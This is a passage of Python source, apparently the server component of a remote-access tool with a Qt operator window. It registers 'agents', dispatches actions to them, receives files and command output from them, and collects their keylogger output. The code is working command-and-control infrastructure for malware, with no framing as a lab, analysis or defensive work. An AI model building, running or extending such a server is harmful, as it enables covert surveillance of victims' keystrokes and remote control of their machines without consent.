                logger.log_message("READY signal sent, preparing to receive file")
                self.file_transfer_service.receive_file(sock, filename)
            except Exception as e:
                logger.log_message(f"Error in from_agent handling: {str(e)}")

    def _handle_command(self, sock: socket.socket, initial_data: str, client_address: tuple):
        """Handle command processing"""
        try:
            keep_alive = self._process_command(sock, initial_data)
            if not keep_alive:
                return

            while True:
                try:
                    data = sock.recv(self.buffer_size).decode('utf-8').strip()
                    if not data:
                        break

                    keep_alive = self._process_command(sock, data)
                    if not keep_alive:
                        break

                except socket.timeout:
                    continue  # Keep connection alive on timeout
                except Exception as e:
                    logger.log_message(f"Error processing command from {client_address}: {e}")
                    break

        except Exception as e:
            logger.log_message(f"Error in command handler for {client_address}: {e}")

    def _process_command(self, sock: socket.socket, data: str) -> bool:
        """Process individual commands and return whether to keep connection alive"""
        logger.log_message(f"Received: {data}")
        parts = data.split('|')
        if not parts:
            sock.sendall(b"Invalid command format")
            return False
            
        command = parts[0]
        try:
            # Special handling for command output
            if command == "command_output" and len(parts) >= 2:
                agent_id = parts[1]
                output = '|'.join(parts[2:]) if len(parts) > 2 else ""
                response = self.command_processor.process_command_output(agent_id, output)
            elif command == "keylogger_output" and len(parts) >= 2:
                agent_id = parts[1]
                output = data.split('|', 2)[2] if len(parts) > 2 else ""
                response = self.command_processor.process_keylogger_output(agent_id, output)
            else:
                # Command dispatch dictionary
                response = {
                    "register": lambda: self.command_processor.process_registration(
                        parts[1], parts[2]
                    ) if len(parts) == 3 else "Invalid registration format",
                    
                    "request_action": lambda: self.command_processor.process_action_request(
                        parts[1]
                    ) if len(parts) == 2 else "Invalid request format",
                    
                    "download_complete": lambda: self.command_processor.process_download_status(
                        parts[1], parts[2], "download_complete"
                    ) if len(parts) == 3 else "Invalid download status format",
                    
                    "download_failed": lambda: self.command_processor.process_download_status(
                        parts[1], parts[2], "download_failed"
                    ) if len(parts) == 3 else "Invalid download status format",
                    
                    "checkin": lambda: "Check-in acknowledged"
                        if len(parts) == 2 else "Invalid checkin format",
                }.get(command, lambda: "Unknown command")()
                
            sock.sendall(response.encode('utf-8'))
            return command not in self.single_transaction_commands
                
        except Exception as e:
            logger.log_message(f"Error processing command {command}: {e}")
            return False

def main():
    # Set up database
    SessionLocal, agent_repository = setup_database(config.DB_PATH)
    
    # Create server manager
    server_manager = ServerManager(config, agent_repository)
    
    # Create Qt application
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    dark_palette = QPalette()
    dark_palette.setColor(QPalette.ColorRole.Window, QColor(53, 53, 53))
    dark_palette.setColor(QPalette.ColorRole.WindowText, Qt.GlobalColor.white)
    dark_palette.setColor(QPalette.ColorRole.Base, QColor(35, 35, 35))
    dark_palette.setColor(QPalette.ColorRole.Text, Qt.GlobalColor.white)
    dark_palette.setColor(QPalette.ColorRole.Button, QColor(53, 53, 53))
    dark_palette.setColor(QPalette.ColorRole.ButtonText, Qt.GlobalColor.white)
    dark_palette.setColor(QPalette.ColorRole.PlaceholderText, QColor(127, 127, 127))
    app.setPalette(dark_palette)

    # Create and show main window
    window = MainWindow(server_manager)
    window.show()
    
    # Start server
    server_manager.start()
    
    # Add shutdown handling to window close
    def extended_close_event(event):
        window.closeEvent(event)  # Call original close event
        server_manager.shutdown()
        
    window.closeEvent = extended_close_event
    
    try:
        sys.exit(app.exec())
    except KeyboardInterrupt:
        logger.log_message("Received shutdown signal")
    finally:
        server_manager.shutdown()

if __name__ == '__main__':
    main()
